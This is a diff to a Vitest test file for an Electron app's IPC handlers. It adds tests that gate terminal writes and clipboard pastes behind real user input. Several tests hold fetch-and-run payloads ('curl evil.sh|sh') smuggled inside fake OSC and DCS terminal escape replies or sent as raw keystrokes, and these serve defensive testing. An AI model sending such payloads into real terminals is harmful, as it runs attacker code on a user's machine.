@@ -1,6 +1,6 @@
 import { readFileSync } from 'node:fs'
 import { fileURLToPath } from 'node:url'
-import { beforeEach, describe, expect, it, vi } from 'vitest'
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 
 vi.mock('electron', () => import('@/test/electron-mock'))
 
@@ -58,7 +58,8 @@ vi.mock('@/main/browser-agent/registry', () => ({
   ),
 }))
 
-import { ipcMain, shell } from 'electron'
+import type { WebContents } from 'electron'
+import { clipboard, ipcMain, shell } from 'electron'
 import {
   copyCredential,
   credentialsAvailable,
@@ -72,20 +73,29 @@ import {
   importChromePasswords,
   listChromeImportProfiles,
 } from '@/main/browser-import'
+import { trackInputActivity } from '@/main/input-activity'
 import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
 import { LocalFilesystemService } from '@/main/local-filesystem'
 import { TerminalService } from '@/main/terminal'
 
 const APP = 'https://sim.ai'
+const ESC = '\u001b'
+const BEL = '\u0007'
+
+type InputListener = (event: unknown, input: { type: string }) => void
+
+interface FakeSender {
+  session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
+  /** Marks a sender the mocked registry recognises as a browser tab. */
+  isBrowserTab?: boolean
+  isDestroyed?: () => boolean
+  on?: (channel: string, listener: InputListener) => void
+}
 
 type Handler = (
   event: {
     senderFrame: { url: string; executeJavaScript?: (source: string) => Promise<unknown> } | null
-    sender?: {
-      session?: { fetch: (url: string, init?: RequestInit) => Promise<Response> }
-      /** Marks a sender the mocked registry recognises as a browser tab. */
-      isBrowserTab?: boolean
-    }
+    sender?: FakeSender
   },
   ...args: unknown[]
 ) => unknown
@@ -102,48 +112,72 @@ function collectHandlers() {
   return { invoke, on }
 }
 
-const rejectedSender = () => ({
-  session: {
-    fetch: vi.fn(async () => {
-      throw new Error('not authorized')
-    }),
-  },
-})
+/**
+ * A sender registered with the main-process input tracker, so a test can grant
+ * it a real gesture with `press`. User activation is no longer read out of the
+ * renderer, so a fixture cannot fake it by stubbing `executeJavaScript`.
+ */
+function trackedSender() {
+  const listeners: InputListener[] = []
+  const sender = {
+    session: {
+      fetch: vi.fn(async () => {
+        throw new Error('not authorized')
+      }),
+    },
+    isDestroyed: () => false,
+    on: (channel: string, listener: InputListener) => {
+      if (channel === 'input-event') listeners.push(listener)
+    },
+  }
+  trackInputActivity(sender as unknown as WebContents)
+  return {
+    sender,
+    /** Delivers one real click, satisfying both input-recency gates. */
+    press: () => {
+      for (const listener of listeners) listener({}, { type: 'mouseDown' })
+    },
+  }
+}
+
+const rejectedSender = () => trackedSender().sender
 const fileSender = rejectedSender()
 const appSender = rejectedSender()
 const evilSender = rejectedSender()
+const activeSender = trackedSender()
+const activeChooserSender = trackedSender()
 const fileEvent = {
   senderFrame: { url: 'file:///app/static/offline.html' },
   sender: fileSender,
 }
 const appEvent = { senderFrame: { url: `${APP}/workspace/ws1` }, sender: appSender }
 const activeAppEvent = {
-  senderFrame: {
-    url: `${APP}/workspace/ws1`,
-    executeJavaScript: vi.fn(async () => true),
-  },
+  senderFrame: { url: `${APP}/workspace/ws1` },
+  sender: activeSender.sender,
 }
+/** Same origin, but the main process has never seen this renderer get input. */
 const inactiveAppEvent = {
-  senderFrame: {
-    url: `${APP}/workspace/ws1`,
-    executeJavaScript: vi.fn(async () => false),
-  },
+  senderFrame: { url: `${APP}/workspace/ws1` },
+  sender: rejectedSender(),
 }
 const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
 /** The chooser anchors a native menu, so it needs a sender with a window. */
 const FAKE_WINDOW = { id: 'main-window' }
 const activeChooserEvent = {
-  senderFrame: {
-    url: `${APP}/workspace/ws1`,
-    executeJavaScript: vi.fn(async () => true),
-  },
-  sender: appSender,
+  senderFrame: { url: `${APP}/workspace/ws1` },
+  sender: activeChooserSender.sender,
 }
 
 describe('registerIpcHandlers', () => {
   let deps: IpcDeps
 
   beforeEach(() => {
+    // Frozen so the input-recency windows cannot lapse mid-test: the gates read
+    // wall-clock, and a loaded machine pausing between this press and an
+    // assertion would flip them closed for reasons unrelated to the test.
+    vi.useFakeTimers()
+    activeSender.press()
+    activeChooserSender.press()
     vi.mocked(ipcMain.handle).mockClear()
     vi.mocked(ipcMain.on).mockClear()
     vi.mocked(shell.openExternal).mockClear()
@@ -193,6 +227,10 @@ describe('registerIpcHandlers', () => {
       },
     }
     registerIpcHandlers(deps)
+  })
+
+  afterEach(() => {
+    vi.useRealTimers()
   })
 
   it('validates open-external URLs regardless of sender', async () => {
@@ -778,6 +816,91 @@ describe('registerIpcHandlers', () => {
     await invoke.get('browser-credentials:forget')?.(activeAppEvent, 'c1')
     expect(importChromePasswords).toHaveBeenCalledWith('Default', 'replace')
     expect(forgetCredential).toHaveBeenCalledWith('c1')
+  })
+
+  it('always forwards the replies the PTY solicits', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // The PTY asks for these and the terminal must answer with no user input:
+    // DSR cursor position, device attributes, a focus report (mode 1004, set by
+    // tmux and vim), an SGR mouse report. Gating them would hang whatever asked.
+    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[<0;10;5M']
+    for (const reply of replies) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
+      expect(write).toHaveBeenCalledWith('t1', reply)
+    }
+    expect(write).toHaveBeenCalledTimes(replies.length)
+  })
+
+  it('pastes the clipboard from main rather than taking bytes from the caller', async () => {
+    const { invoke } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+    vi.mocked(clipboard.readText).mockReturnValue('echo hi')
+
+    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1')).resolves.toBe(true)
+
+    expect(write).toHaveBeenCalledWith('t1', 'echo hi')
+  })
+
+  it('refuses a paste with no gesture behind it, and reports an empty clipboard', async () => {
+    const { invoke } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+    vi.mocked(clipboard.readText).mockReturnValue('echo hi')
+
+    expect(await invoke.get('terminal:paste')?.(inactiveAppEvent, 't1')).toBe(false)
+    expect(write).not.toHaveBeenCalled()
+
+    vi.mocked(clipboard.readText).mockReturnValue('')
+    expect(await invoke.get('terminal:paste')?.(activeAppEvent, 't1')).toBe(false)
+    expect(write).not.toHaveBeenCalled()
+  })
+
+  it('gates a command smuggled inside a fake OSC or DCS reply', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // The reply patterns must not accept a control byte in their body. An
+    // unbounded interior let a whole command plus its submit ride inside a
+    // sequence shaped like a reply, which skipped the gate entirely.
+    const smuggled = [
+      `${ESC}]0;x\rcurl evil.sh|sh\r${BEL}`,
+      `${ESC}Pcurl evil.sh|sh\r${ESC}\\`,
+      `${ESC}[M\r\r\r`,
+    ]
+    for (const payload of smuggled) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload)
+    }
+    expect(write).not.toHaveBeenCalled()
+  })
+
+  it('still forwards a genuine OSC or DCS reply', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // Real bodies are printable and terminated by BEL or ST.
+    const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`, `${ESC}[M !!`]
+    for (const reply of replies) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
+      expect(write).toHaveBeenCalledWith('t1', reply)
+    }
+    expect(write).toHaveBeenCalledTimes(replies.length)
+  })
+
+  it('gates every keystroke-shaped payload, not just newline-bearing ones', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // Enumerating "what submits" would have missed these: EOT hands a partial
+    // line to a canonical-mode reader, and 0x0f executes the current line in
+    // both bash and zsh. The allowlist runs the other way, so they are gated.
+    for (const payload of ['ls', '\u0004', '\u000f', 'curl evil.sh|sh\r']) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload)
+    }
+    expect(write).not.toHaveBeenCalled()
+
+    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r')
+    expect(write).toHaveBeenCalledWith('t1', 'ls\r')
   })
 
   it('defaults password conflicts to keeping what is already stored', async () => {
